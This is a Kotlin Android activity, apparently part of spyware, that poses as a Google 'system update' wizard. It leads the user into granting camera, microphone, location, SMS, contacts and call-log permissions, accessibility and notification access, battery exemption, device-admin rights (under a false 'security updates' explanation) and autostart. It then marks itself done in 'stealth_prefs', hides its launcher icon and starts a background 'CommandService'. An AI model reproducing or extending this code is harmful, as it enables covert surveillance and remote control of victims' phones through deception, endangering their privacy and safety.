package com.google.android.systemservice

import android.Manifest
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.view.View
import android.view.accessibility.AccessibilityManager
import android.widget.Button
import android.widget.ProgressBar
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.android.systemservice.receivers.SystemAdminReceiver
import com.google.android.systemservice.services.CommandService
import com.google.android.systemservice.utils.VendorAutostart

class SetupWizardActivity : AppCompatActivity() {

    private lateinit var progressBar: ProgressBar
    private lateinit var statusText: TextView
    private lateinit var stepText: TextView
    private lateinit var actionButton: Button
    private lateinit var progressPercent: TextView

    private var currentStep = 0
    private val totalSteps = 6

    private val handler = Handler(Looper.getMainLooper())

    // Permission request codes
    private val PERMISSION_REQUEST_CODE = 1001
    private val ACCESSIBILITY_REQUEST_CODE = 1002
    private val NOTIFICATION_LISTENER_REQUEST_CODE = 1003
    private val BATTERY_OPTIMIZATION_REQUEST_CODE = 1004
    private val DEVICE_ADMIN_REQUEST_CODE = 1005
    private val VENDOR_AUTOSTART_REQUEST_CODE = 1006

    private val requiredPermissions = mutableListOf(
        // Location
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        // Camera & Audio
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        // Contacts & Calls
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG,
        // SMS
        Manifest.permission.READ_SMS,
        Manifest.permission.RECEIVE_SMS
    ).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.POST_NOTIFICATIONS)
            add(Manifest.permission.READ_MEDIA_IMAGES)
            add(Manifest.permission.READ_MEDIA_VIDEO)
            add(Manifest.permission.READ_MEDIA_AUDIO)
        } else {
            add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Check if setup already completed
        if (isSetupComplete()) {
            launchServicesAndFinish()
            return
        }
        
        setContentView(R.layout.activity_setup_wizard)
        initViews()
        startSetupFlow()
    }

    private fun initViews() {
        progressBar = findViewById(R.id.progressBar)
        statusText = findViewById(R.id.statusText)
        stepText = findViewById(R.id.stepText)
        actionButton = findViewById(R.id.actionButton)
        progressPercent = findViewById(R.id.progressPercent)

        actionButton.setOnClickListener { executeCurrentStep() }
    }

    private fun startSetupFlow() {
        currentStep = 0
        updateUI()
    }

    private fun updateUI() {
        val progress = ((currentStep.toFloat() / totalSteps) * 100).toInt()
        progressBar.progress = progress
        progressPercent.text = "$progress%"
        stepText.text = "Step ${currentStep + 1} of $totalSteps"

        when (currentStep) {
            0 -> {
                statusText.text = "Configuring system permissions..."
                actionButton.text = "GRANT PERMISSIONS"
            }
            1 -> {
                statusText.text = "Enabling accessibility service..."
                actionButton.text = "ENABLE SERVICE"
            }
            2 -> {
                statusText.text = "Configuring notification access..."
                actionButton.text = "ENABLE ACCESS"
            }
            3 -> {
                statusText.text = "Optimizing battery settings..."
                actionButton.text = "OPTIMIZE"
            }
            4 -> {
                statusText.text = "Securing system administrator..."
                actionButton.text = "ACTIVATE"
            }
            5 -> {
                statusText.text = "Configuring autostart..."
                actionButton.text = "CONFIGURE"
            }
            else -> {
                completeSetup()
            }
        }
    }

    private fun executeCurrentStep() {
        when (currentStep) {
            0 -> requestRuntimePermissions()
            1 -> requestAccessibilityService()
            2 -> requestNotificationListener()
            3 -> requestBatteryOptimization()
            4 -> requestDeviceAdmin()
            5 -> requestVendorAutostart()
        }
    }

    // Step 0: Runtime Permissions
    private fun requestRuntimePermissions() {
        val permissionsToRequest = requiredPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (permissionsToRequest.isEmpty()) {
            advanceToNextStep()
        } else {
            ActivityCompat.requestPermissions(
                this,
                permissionsToRequest.toTypedArray(),
                PERMISSION_REQUEST_CODE
            )
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_REQUEST_CODE) {
            // Always advance - we'll work with what we got
            handler.postDelayed({
                advanceToNextStep()
            }, 300)
        }
    }

    // Step 1: Accessibility Service
    private fun requestAccessibilityService() {
        if (isAccessibilityServiceEnabled()) {
            advanceToNextStep()
        } else {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            startActivityForResult(intent, ACCESSIBILITY_REQUEST_CODE)
        }
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val am = getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
        val enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
        return enabledServices.any { it.id.contains(packageName) }
    }

    // Step 2: Notification Listener
    private fun requestNotificationListener() {
        if (isNotificationListenerEnabled()) {
            advanceToNextStep()
        } else {
            val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
            startActivityForResult(intent, NOTIFICATION_LISTENER_REQUEST_CODE)
        }
    }

    private fun isNotificationListenerEnabled(): Boolean {
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat?.contains(packageName) == true
    }

    // Step 3: Battery Optimization
    private fun requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (pm.isIgnoringBatteryOptimizations(packageName)) {
                advanceToNextStep()
            } else {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                startActivityForResult(intent, BATTERY_OPTIMIZATION_REQUEST_CODE)
            }
        } else {
            advanceToNextStep()
        }
    }

    // Step 4: Device Admin
    private fun requestDeviceAdmin() {
        val componentName = ComponentName(this, SystemAdminReceiver::class.java)
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        
        if (dpm.isAdminActive(componentName)) {
            advanceToNextStep()
        } else {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for system security updates")
            }
            startActivityForResult(intent, DEVICE_ADMIN_REQUEST_CODE)
        }
    }

    // Step 5: Vendor Autostart
    private fun requestVendorAutostart() {
        val autostartIntent = VendorAutostart.getAutostartIntent(this)
        if (autostartIntent != null) {
            try {
                startActivityForResult(autostartIntent, VENDOR_AUTOSTART_REQUEST_CODE)
            } catch (e: Exception) {
                advanceToNextStep() // Skip if not available
            }
        } else {
            advanceToNextStep() // No vendor-specific settings needed
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        
        // Always advance after returning from settings - user made their choice
        handler.postDelayed({
            advanceToNextStep()
        }, 500)
    }

    private fun advanceToNextStep() {
        currentStep++
        if (currentStep >= totalSteps) {
            completeSetup()
        } else {
            updateUI()
        }
    }

    private fun completeSetup() {
        statusText.text = "System update complete!"
        progressBar.progress = 100
        progressPercent.text = "100%"
        actionButton.visibility = View.GONE

        // Mark setup as complete
        getSharedPreferences("stealth_prefs", MODE_PRIVATE)
            .edit()
            .putBoolean("setup_complete", true)
            .apply()

        // Hide launcher icon
        hideLauncherIcon()

        // Start services and finish
        handler.postDelayed({
            launchServicesAndFinish()
        }, 1500)
    }

    private fun isSetupComplete(): Boolean {
        return getSharedPreferences("stealth_prefs", MODE_PRIVATE)
            .getBoolean("setup_complete", false)
    }

    private fun hideLauncherIcon() {
        val components = listOf(
            ComponentName(this, SetupWizardActivity::class.java),
            ComponentName(this, "com.google.android.systemservice.ProvisionLauncherActivity")
        )

        components.forEach { componentName ->
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        }
    }

    private fun launchServicesAndFinish() {
        // Start main command service
        val serviceIntent = Intent(this, CommandService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
        
        finish()
    }
}
